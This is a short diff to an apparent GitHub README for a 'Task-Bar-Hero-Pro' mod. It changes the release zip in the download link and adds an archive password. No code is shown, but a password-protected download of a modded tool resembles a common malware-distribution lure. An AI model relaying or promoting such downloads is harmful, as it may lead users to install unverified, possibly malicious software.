@@ -61,11 +61,12 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/FractionTurtle51/Task-Bar-Hero-Pro/releases/download/4/TBHProMod.zip">
+  <a href="https://github.com/FractionTurtle51/Task-Bar-Hero-Pro/releases/download/4/TBHPro.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
+## Password: TBH2026
 ---
 
 ## 🛡️ Important Warning
